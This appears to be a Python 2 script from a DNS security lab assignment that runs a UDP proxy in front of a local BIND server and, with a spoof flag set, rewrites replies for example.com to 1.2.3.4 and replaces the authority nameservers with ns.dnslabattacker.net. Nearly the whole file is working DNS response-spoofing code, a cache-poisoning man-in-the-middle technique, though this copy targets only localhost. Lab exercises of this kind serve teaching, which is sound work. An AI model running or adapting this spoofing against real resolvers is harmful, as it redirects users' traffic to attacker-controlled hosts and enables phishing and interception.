#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *
from contextlib import closing

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response
# Proxy and BIND ip address
host = '127.0.0.1'

if __name__ == "__main__":
    with closing(socket.socket(socket.AF_INET, socket.SOCK_DGRAM)) as proxy_socket:
        proxy_socket.bind((host, port))

        while True:
            request, request_address = proxy_socket.recvfrom(1024)
    
            with closing(socket.socket(socket.AF_INET, socket.SOCK_DGRAM)) as dns_socket:
                dns_socket.sendto(request, (host, dns_port))
                response = dns_socket.recv(1024)
                dns_reply = DNS(response)

                if SPOOF:
                    if dns_reply[DNSQR].qname == "example.com.":
                        dns_reply[DNSRR].rdata = "1.2.3.4"

                        dns_reply[DNS].arcount = 0

                        for i in range(dns_reply[DNS].nscount):
                            dns_reply[DNS].ns[DNSRR][i].rdata = "ns.dnslabattacker.net"

                        dns_reply[DNS].nscount = 1

            proxy_socket.sendto(bytes(dns_reply), request_address)
